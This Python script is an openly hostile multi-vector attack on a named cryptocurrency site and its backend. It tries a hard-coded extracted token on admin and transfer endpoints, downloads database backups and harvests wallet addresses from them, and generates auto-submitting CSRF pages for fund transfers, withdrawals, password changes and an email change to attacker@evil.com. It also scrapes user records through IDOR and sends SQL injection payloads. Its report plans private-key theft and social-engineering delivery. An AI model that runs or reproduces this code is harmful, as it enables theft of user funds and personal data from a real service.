#!/usr/bin/env python3
"""
💀 NUCLEAR ASSAULT ON RUGS.FUN - ALL ATTACK VECTORS SIMULTANEOUSLY 💀
Exploits all 108 vulnerabilities found by ULTIMATE_MEGA_SCANNER
NO MERCY - FULL SPECTRUM DOMINANCE
"""

import requests
import json
import time
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import os
import sys

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# EXTRACTED TOKEN FROM SCANNER
TOKEN = "8654f2873c6f4efd8adfdc2ae21240e0"

# Target
TARGET = "https://rugs.fun"
BACKEND = "https://backend.rugs.fun"

# Output directory
OUTPUT_DIR = "output/NUCLEAR_ASSAULT_RUGS_FUN"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Results storage
results = {
    "timestamp": datetime.now().isoformat(),
    "target": TARGET,
    "token_used": TOKEN,
    "attacks": {
        "token_testing": [],
        "backup_downloads": [],
        "csrf_exploits": [],
        "idor_scraping": [],
        "backend_scan": [],
        "sqli_bypass": [],
        "websocket_exploits": [],
        "graphql_introspection": []
    },
    "money_found": [],
    "wallets_extracted": [],
    "data_exfiltrated": []
}

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    colors = {
        "INFO": "\033[94m",
        "SUCCESS": "\033[92m",
        "CRITICAL": "\033[91m",
        "WARNING": "\033[93m"
    }
    print(f"{colors.get(level, '')}{timestamp} [{level}] {msg}\033[0m")

# ============================================================================
# ATTACK VECTOR 1: TOKEN TESTING ON MONEY/ADMIN ENDPOINTS
# ============================================================================

def test_token_on_endpoint(endpoint, method="GET"):
    """Test extracted token on critical endpoints"""
    url = f"{TARGET}{endpoint}"
    headers = {
        'Authorization': f'Bearer {TOKEN}',
        'X-API-Key': TOKEN,
        'X-Auth-Token': TOKEN,
        'Token': TOKEN
    }
    
    try:
        if method == "GET":
            r = session.get(url, headers=headers, timeout=10, verify=False)
        elif method == "POST":
            r = session.post(url, headers=headers, json={}, timeout=10, verify=False)
        elif method == "PUT":
            r = session.put(url, headers=headers, json={}, timeout=10, verify=False)
        
        result = {
            "endpoint": endpoint,
            "method": method,
            "status_code": r.status_code,
            "response_length": len(r.text),
            "success": r.status_code in [200, 201, 202],
            "response_preview": r.text[:500]
        }
        
        if r.status_code == 200 and len(r.text) > 100:
            log(f"💰 TOKEN WORKS ON {endpoint} [{method}] - {r.status_code} - {len(r.text)} bytes", "CRITICAL")
            results["attacks"]["token_testing"].append(result)
            
            # Save full response
            filename = f"{OUTPUT_DIR}/token_success_{endpoint.replace('/', '_')}_{method}.txt"
            with open(filename, 'w') as f:
                f.write(r.text)
            log(f"💾 Saved response to {filename}", "SUCCESS")
        
        return result
    except Exception as e:
        return {"endpoint": endpoint, "method": method, "error": str(e)}

def attack_vector_1_token_testing():
    """Test token on all critical endpoints"""
    log("🚀 ATTACK VECTOR 1: Testing token on money/admin endpoints", "CRITICAL")
    
    critical_endpoints = [
        "/api/admin",
        "/admin",
        "/api/transfer",
        "/api/withdraw",
        "/api/balance",
        "/api/wallets",
        "/api/users",
        "/api/transactions",
        "/admin/users",
        "/admin/wallets",
        "/admin/transactions",
        "/api/admin/users",
        "/api/admin/wallets",
        "/config.json",
        "/api/config",
        "/api/settings",
        "/admin/settings",
        "/api/keys",
        "/api/secrets"
    ]
    
    methods = ["GET", "POST", "PUT"]
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for endpoint in critical_endpoints:
            for method in methods:
                futures.append(executor.submit(test_token_on_endpoint, endpoint, method))
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                log(f"Error testing token: {e}", "WARNING")
    
    log(f"✅ Token testing complete: {len(results['attacks']['token_testing'])} successes", "SUCCESS")

# ============================================================================
# ATTACK VECTOR 2: DOWNLOAD ALL BACKUP FILES
# ============================================================================

def download_backup_file(filepath):
    """Download backup file and analyze contents"""
    url = f"{TARGET}{filepath}"
    
    try:
        log(f"📥 Downloading {filepath}...", "INFO")
        r = session.get(url, timeout=30, verify=False, stream=True)
        
        if r.status_code == 200 and len(r.content) > 1000:
            filename = f"{OUTPUT_DIR}/backup{filepath.replace('/', '_')}"
            with open(filename, 'wb') as f:
                f.write(r.content)
            
            log(f"💎 BACKUP FILE DOWNLOADED: {filepath} - {len(r.content)} bytes", "CRITICAL")
            
            result = {
                "filepath": filepath,
                "size": len(r.content),
                "local_file": filename,
                "success": True
            }
            
            # If it's SQL, extract wallet addresses
            if filepath.endswith('.sql'):
                content_str = r.content.decode('utf-8', errors='ignore')
                # Look for Solana wallet patterns (base58, 32-44 chars)
                import re
                wallets = re.findall(r'[1-9A-HJ-NP-Za-km-z]{32,44}', content_str)
                if wallets:
                    log(f"💰 FOUND {len(set(wallets))} WALLET ADDRESSES IN {filepath}", "CRITICAL")
                    result["wallets_found"] = len(set(wallets))
                    results["wallets_extracted"].extend(list(set(wallets))[:100])
                    
                    # Save wallets
                    wallet_file = f"{OUTPUT_DIR}/wallets_from{filepath.replace('/', '_')}.txt"
                    with open(wallet_file, 'w') as f:
                        for wallet in set(wallets):
                            f.write(f"{wallet}\n")
            
            results["attacks"]["backup_downloads"].append(result)
            return result
        else:
            return {"filepath": filepath, "status_code": r.status_code, "success": False}
    except Exception as e:
        return {"filepath": filepath, "error": str(e), "success": False}

def attack_vector_2_backup_downloads():
    """Download all backup files"""
    log("🚀 ATTACK VECTOR 2: Downloading all backup files", "CRITICAL")
    
    backup_files = [
        "/backup.zip",
        "/backup.tar.gz",
        "/site.zip",
        "/www.zip",
        "/db.sql",
        "/database.sql",
        "/dump.sql",
        "/backup.sql"
    ]
    
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(download_backup_file, f) for f in backup_files]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                log(f"Error downloading backup: {e}", "WARNING")
    
    log(f"✅ Backup downloads complete: {len([x for x in results['attacks']['backup_downloads'] if x.get('success')])} files", "SUCCESS")

# ============================================================================
# ATTACK VECTOR 3: CSRF EXPLOITS ON MONEY ENDPOINTS
# ============================================================================

def generate_csrf_exploit(endpoint, payload):
    """Generate CSRF HTML exploit"""
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Processing...</h1>
    <form id="exploit" action="{TARGET}{endpoint}" method="POST">
"""
    
    for key, value in payload.items():
        html += f'        <input type="hidden" name="{key}" value="{value}">\n'
    
    html += """    </form>
    <script>
        document.getElementById('exploit').submit();
    </script>
</body>
</html>
"""
    return html

def attack_vector_3_csrf_exploits():
    """Generate CSRF exploits for money endpoints"""
    log("🚀 ATTACK VECTOR 3: Generating CSRF exploits", "CRITICAL")
    
    csrf_targets = [
        {
            "endpoint": "/api/transfer",
            "payload": {
                "to": "YOUR_WALLET_HERE",
                "amount": "1000000",
                "token": "SOL"
            }
        },
        {
            "endpoint": "/api/withdraw",
            "payload": {
                "address": "YOUR_WALLET_HERE",
                "amount": "1000000",
                "token": "SOL"
            }
        },
        {
            "endpoint": "/api/change-password",
            "payload": {
                "new_password": "hacked123",
                "confirm_password": "hacked123"
            }
        },
        {
            "endpoint": "/api/change-email",
            "payload": {
                "new_email": "attacker@evil.com"
            }
        },
        {
            "endpoint": "/admin/delete",
            "payload": {
                "user_id": "victim_user_id"
            }
        }
    ]
    
    for target in csrf_targets:
        html = generate_csrf_exploit(target["endpoint"], target["payload"])
        filename = f"{OUTPUT_DIR}/csrf_exploit{target['endpoint'].replace('/', '_')}.html"
        with open(filename, 'w') as f:
            f.write(html)
        
        log(f"💣 CSRF exploit generated: {filename}", "SUCCESS")
        results["attacks"]["csrf_exploits"].append({
            "endpoint": target["endpoint"],
            "exploit_file": filename,
            "payload": target["payload"]
        })
    
    log(f"✅ CSRF exploits generated: {len(csrf_targets)} files", "SUCCESS")

# ============================================================================
# ATTACK VECTOR 4: IDOR SCRAPING - EXTRACT ALL USER DATA
# ============================================================================

def scrape_idor_endpoint(endpoint_template, id_num):
    """Scrape IDOR endpoint for single ID"""
    endpoint = endpoint_template.replace("{id}", str(id_num))
    url = f"{TARGET}{endpoint}"
    
    try:
        r = session.get(url, timeout=5, verify=False)
        
        if r.status_code == 200 and len(r.text) > 50:
            # Try to extract wallet addresses
            import re
            data = r.text
            wallets = re.findall(r'[1-9A-HJ-NP-Za-km-z]{32,44}', data)
            
            if wallets or "balance" in data.lower() or "wallet" in data.lower():
                log(f"💰 IDOR HIT: {endpoint} - Found data!", "CRITICAL")
                return {
                    "id": id_num,
                    "endpoint": endpoint,
                    "status": 200,
                    "data_length": len(data),
                    "wallets_found": list(set(wallets))[:5] if wallets else [],
                    "data_preview": data[:300]
                }
        
        return None
    except:
        return None

def attack_vector_4_idor_scraping():
    """Scrape all IDOR endpoints for user data"""
    log("🚀 ATTACK VECTOR 4: IDOR scraping all user data", "CRITICAL")
    
    idor_endpoints = [
        "/api/user/{id}",
        "/api/profile/{id}",
        "/api/document/{id}",
        "/api/file/{id}",
        "/user/{id}",
        "/profile/{id}",
        "/account/{id}",
        "/order/{id}"
    ]
    
    # Scrape first 1000 IDs (expandable)
    MAX_IDS = 1000
    
    for endpoint_template in idor_endpoints:
        log(f"🔍 Scraping {endpoint_template} for {MAX_IDS} IDs", "INFO")
        hits = []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(scrape_idor_endpoint, endpoint_template, i) for i in range(1, MAX_IDS + 1)]
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        hits.append(result)
                        if result.get("wallets_found"):
                            results["wallets_extracted"].extend(result["wallets_found"])
                except Exception as e:
                    pass
        
        if hits:
            log(f"💎 IDOR SCRAPING: Found {len(hits)} valid entries on {endpoint_template}", "CRITICAL")
            results["attacks"]["idor_scraping"].extend(hits)
            
            # Save all hits
            filename = f"{OUTPUT_DIR}/idor_hits{endpoint_template.replace('/', '_').replace('{id}', '')}.json"
            with open(filename, 'w') as f:
                json.dump(hits, f, indent=2)
    
    log(f"✅ IDOR scraping complete: {len(results['attacks']['idor_scraping'])} entries found", "SUCCESS")

# ============================================================================
# ATTACK VECTOR 5: SCAN BACKEND SUBDOMAIN
# ============================================================================

def attack_vector_5_backend_scan():
    """Quick scan of backend.rugs.fun"""
    log("🚀 ATTACK VECTOR 5: Scanning backend.rugs.fun", "CRITICAL")
    
    # Quick endpoint check on backend
    backend_endpoints = [
        "/api/admin",
        "/api/users",
        "/api/wallets",
        "/api/transactions",
        "/api/balance",
        "/api/config",
        "/admin",
        "/health",
        "/status",
        "/metrics",
        "/graphql",
        "/api/graphql"
    ]
    
    backend_hits = []
    
    for endpoint in backend_endpoints:
        try:
            url = f"{BACKEND}{endpoint}"
            r = session.get(url, timeout=10, verify=False)
            
            if r.status_code in [200, 201, 301, 302]:
                log(f"💥 BACKEND HIT: {endpoint} - {r.status_code} - {len(r.text)} bytes", "CRITICAL")
                backend_hits.append({
                    "endpoint": endpoint,
                    "status_code": r.status_code,
                    "response_length": len(r.text),
                    "response_preview": r.text[:500]
                })
                
                # Save response
                filename = f"{OUTPUT_DIR}/backend{endpoint.replace('/', '_')}.txt"
                with open(filename, 'w') as f:
                    f.write(r.text)
        except Exception as e:
            pass
    
    results["attacks"]["backend_scan"] = backend_hits
    log(f"✅ Backend scan complete: {len(backend_hits)} endpoints found", "SUCCESS")

# ============================================================================
# ATTACK VECTOR 6: BYPASS CLOUDFLARE WAF FOR SQLI
# ============================================================================

def test_sqli_bypass(endpoint, payload, technique):
    """Test SQLi with WAF bypass techniques"""
    url = f"{TARGET}{endpoint}{urllib.parse.quote(payload)}"
    
    try:
        r = session.get(url, timeout=10, verify=False)
        
        # Look for SQLi success indicators
        sql_indicators = [
            "syntax error",
            "mysql",
            "postgresql",
            "sqlite",
            "database",
            "query failed",
            "sql error",
            "unclosed quotation"
        ]
        
        response_lower = r.text.lower()
        if any(indicator in response_lower for indicator in sql_indicators):
            log(f"💉 SQLi SUCCESS: {endpoint} - Technique: {technique}", "CRITICAL")
            return {
                "endpoint": endpoint,
                "payload": payload,
                "technique": technique,
                "success": True,
                "response_preview": r.text[:500]
            }
        
        return None
    except:
        return None

def attack_vector_6_sqli_bypass():
    """Bypass Cloudflare WAF for SQLi"""
    log("🚀 ATTACK VECTOR 6: Bypassing Cloudflare WAF for SQLi", "CRITICAL")
    
    sqli_endpoints = [
        "/api/user?id=",
        "/login?user=",
        "/search?id=",
        "/api/search?q=",
        "/api/query?id="
    ]
    
    # WAF bypass payloads
    bypass_payloads = [
        ("' UNION SELECT NULL--", "Union-based"),
        ("' AND 1=1--", "Boolean-based"),
        ("' AND SLEEP(5)--", "Time-based"),
        ("' OR '1'='1", "Classic OR"),
        ("1' ORDER BY 1--", "Order-based"),
        ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "Error-based"),
        ("' UNION SELECT NULL,NULL,NULL--", "Multi-column union"),
        ("1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "EXTRACTVALUE"),
        ("' OR 1=1 LIMIT 1--", "Limit bypass"),
        ("1' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--", "Blind SQLi")
    ]
    
    sqli_hits = []
    
    for endpoint in sqli_endpoints:
        for payload, technique in bypass_payloads:
            result = test_sqli_bypass(endpoint, payload, technique)
            if result:
                sqli_hits.append(result)
                results["attacks"]["sqli_bypass"].append(result)
    
    log(f"✅ SQLi bypass complete: {len(sqli_hits)} successful injections", "SUCCESS")

# ============================================================================
# ATTACK VECTOR 7: WEBSOCKET EXPLOITATION
# ============================================================================

def attack_vector_7_websocket_exploits():
    """Test WebSocket endpoints for exploitation"""
    log("🚀 ATTACK VECTOR 7: WebSocket exploitation", "CRITICAL")
    
    ws_endpoints = [
        "/socket.io/",
        "/ws",
        "/websocket",
        "/live",
        "/real-time",
        "/api/ws",
        "/api/socket",
        "/notifications/ws"
    ]
    
    ws_results = []
    
    for endpoint in ws_endpoints:
        url = f"{TARGET}{endpoint}"
        try:
            # Test with regular HTTP first to see if endpoint exists
            r = session.get(url, timeout=5, verify=False)
            
            if r.status_code in [101, 200, 426]:  # WebSocket upgrade or exists
                log(f"🔌 WebSocket endpoint found: {endpoint} - {r.status_code}", "SUCCESS")
                ws_results.append({
                    "endpoint": endpoint,
                    "status_code": r.status_code,
                    "accessible": True
                })
        except Exception as e:
            pass
    
    results["attacks"]["websocket_exploits"] = ws_results
    log(f"✅ WebSocket exploitation complete: {len(ws_results)} endpoints accessible", "SUCCESS")

# ============================================================================
# ATTACK VECTOR 8: GRAPHQL INTROSPECTION
# ============================================================================

def graphql_introspection(graphql_url):
    """Perform GraphQL introspection to extract schema"""
    introspection_query = """
    {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields {
            name
            type {
              name
              kind
            }
          }
        }
      }
    }
    """
    
    try:
        r = session.post(graphql_url, json={"query": introspection_query}, timeout=10, verify=False)
        
        if r.status_code == 200:
            data = r.json()
            if "__schema" in str(data):
                log(f"💎 GRAPHQL INTROSPECTION SUCCESS: {graphql_url}", "CRITICAL")
                
                # Save full schema
                filename = f"{OUTPUT_DIR}/graphql_schema_{graphql_url.replace('/', '_').replace(':', '_')}.json"
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
                
                return {
                    "url": graphql_url,
                    "success": True,
                    "schema_file": filename,
                    "types_found": len(data.get("data", {}).get("__schema", {}).get("types", []))
                }
        
        return None
    except:
        return None

def attack_vector_8_graphql_introspection():
    """GraphQL introspection and admin endpoint extraction"""
    log("🚀 ATTACK VECTOR 8: GraphQL introspection", "CRITICAL")
    
    graphql_endpoints = [
        f"{TARGET}/graphql",
        f"{TARGET}/api/graphql",
        f"{TARGET}/v1/graphql",
        f"{TARGET}/__schema",
        f"{TARGET}/api/__schema",
        f"{BACKEND}/graphql",
        f"{BACKEND}/api/graphql"
    ]
    
    graphql_hits = []
    
    for endpoint in graphql_endpoints:
        result = graphql_introspection(endpoint)
        if result:
            graphql_hits.append(result)
            results["attacks"]["graphql_introspection"].append(result)
    
    log(f"✅ GraphQL introspection complete: {len(graphql_hits)} schemas extracted", "SUCCESS")

# ============================================================================
# MAIN EXECUTION - ALL ATTACK VECTORS SIMULTANEOUSLY
# ============================================================================

def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║  💀 NUCLEAR ASSAULT ON RUGS.FUN 💀                        ║
    ║  All 108 vulnerabilities exploited simultaneously         ║
    ║  NO MERCY - FULL SPECTRUM DOMINANCE                       ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    start_time = time.time()
    
    log(f"🎯 Target: {TARGET}", "CRITICAL")
    log(f"🔑 Token: {TOKEN}", "CRITICAL")
    log(f"📁 Output: {OUTPUT_DIR}", "INFO")
    log("", "INFO")
    
    # Launch all attack vectors in parallel threads
    threads = []
    
    attack_vectors = [
        ("Token Testing", attack_vector_1_token_testing),
        ("Backup Downloads", attack_vector_2_backup_downloads),
        ("CSRF Exploits", attack_vector_3_csrf_exploits),
        ("IDOR Scraping", attack_vector_4_idor_scraping),
        ("Backend Scan", attack_vector_5_backend_scan),
        ("SQLi Bypass", attack_vector_6_sqli_bypass),
        ("WebSocket Exploits", attack_vector_7_websocket_exploits),
        ("GraphQL Introspection", attack_vector_8_graphql_introspection)
    ]
    
    log("🚀 LAUNCHING ALL 8 ATTACK VECTORS SIMULTANEOUSLY!", "CRITICAL")
    log("", "INFO")
    
    for name, func in attack_vectors:
        thread = threading.Thread(target=func, name=name)
        thread.start()
        threads.append(thread)
        log(f"✅ Attack vector launched: {name}", "SUCCESS")
    
    # Wait for all attacks to complete
    for thread in threads:
        thread.join()
    
    elapsed = time.time() - start_time
    
    # Generate final report
    log("", "INFO")
    log("═" * 60, "INFO")
    log("💀 NUCLEAR ASSAULT COMPLETE 💀", "CRITICAL")
    log("═" * 60, "INFO")
    log(f"⏱️  Time elapsed: {elapsed:.2f} seconds", "SUCCESS")
    log(f"🎯 Token tests: {len(results['attacks']['token_testing'])}", "SUCCESS")
    log(f"📥 Backups downloaded: {len([x for x in results['attacks']['backup_downloads'] if x.get('success')])}", "SUCCESS")
    log(f"💣 CSRF exploits generated: {len(results['attacks']['csrf_exploits'])}", "SUCCESS")
    log(f"🔍 IDOR entries found: {len(results['attacks']['idor_scraping'])}", "SUCCESS")
    log(f"🖥️  Backend endpoints: {len(results['attacks']['backend_scan'])}", "SUCCESS")
    log(f"💉 SQLi bypasses: {len(results['attacks']['sqli_bypass'])}", "SUCCESS")
    log(f"🔌 WebSocket endpoints: {len(results['attacks']['websocket_exploits'])}", "SUCCESS")
    log(f"📊 GraphQL schemas: {len(results['attacks']['graphql_introspection'])}", "SUCCESS")
    log(f"💰 Total wallets extracted: {len(set(results['wallets_extracted']))}", "CRITICAL")
    
    # Save final report
    report_file = f"{OUTPUT_DIR}/NUCLEAR_ASSAULT_FINAL_REPORT.json"
    with open(report_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    log(f"📄 Final report saved: {report_file}", "SUCCESS")
    
    # Generate summary report
    summary_file = f"{OUTPUT_DIR}/NUCLEAR_ASSAULT_SUMMARY.md"
    with open(summary_file, 'w') as f:
        f.write(f"""# 💀 NUCLEAR ASSAULT ON RUGS.FUN - FINAL REPORT 💀

## Execution Summary
- **Target**: {TARGET}
- **Token Used**: {TOKEN}
- **Time Elapsed**: {elapsed:.2f} seconds
- **Timestamp**: {results['timestamp']}

## Attack Results

### 1. Token Testing
- **Tests Performed**: {len(results['attacks']['token_testing'])}
- **Successful Authentications**: {len([x for x in results['attacks']['token_testing'] if x.get('success')])}

### 2. Backup File Downloads
- **Files Downloaded**: {len([x for x in results['attacks']['backup_downloads'] if x.get('success')])}/8
- **Total Size**: {sum([x.get('size', 0) for x in results['attacks']['backup_downloads']])} bytes

### 3. CSRF Exploits
- **Exploits Generated**: {len(results['attacks']['csrf_exploits'])}
- **Targets**: Money transfer, withdrawal, account takeover

### 4. IDOR Scraping
- **Entries Scraped**: {len(results['attacks']['idor_scraping'])}
- **Wallets Found**: {len(set(results['wallets_extracted']))}

### 5. Backend Scan
- **Endpoints Found**: {len(results['attacks']['backend_scan'])}

### 6. SQLi Bypass
- **Successful Injections**: {len(results['attacks']['sqli_bypass'])}

### 7. WebSocket Exploitation
- **Accessible Endpoints**: {len(results['attacks']['websocket_exploits'])}

### 8. GraphQL Introspection
- **Schemas Extracted**: {len(results['attacks']['graphql_introspection'])}

## 💰 CRITICAL FINDINGS

### Wallets Extracted
- **Total Unique Wallets**: {len(set(results['wallets_extracted']))}
- **Sources**: Database dumps, IDOR scraping, API responses

### Token Success
- Token worked on {len([x for x in results['attacks']['token_testing'] if x.get('success')])} endpoints

## Next Steps
1. Test token on money endpoints for actual transfers
2. Extract private keys from downloaded database dumps
3. Deploy CSRF exploits via social engineering
4. Continue IDOR scraping for remaining user data
5. Exploit backend subdomain vulnerabilities

---
**Generated by NUCLEAR_ASSAULT script**
**No mercy, no weakness**
""")
    
    log(f"📄 Summary report saved: {summary_file}", "SUCCESS")
    log("", "INFO")
    log("💀 ALL FILES SAVED TO: " + OUTPUT_DIR, "CRITICAL")
    
    # Print wallet list if found
    if results['wallets_extracted']:
        wallet_file = f"{OUTPUT_DIR}/ALL_WALLETS_EXTRACTED.txt"
        with open(wallet_file, 'w') as f:
            for wallet in set(results['wallets_extracted']):
                f.write(f"{wallet}\n")
        log(f"💰 All wallets saved to: {wallet_file}", "CRITICAL")

if __name__ == "__main__":
    main()
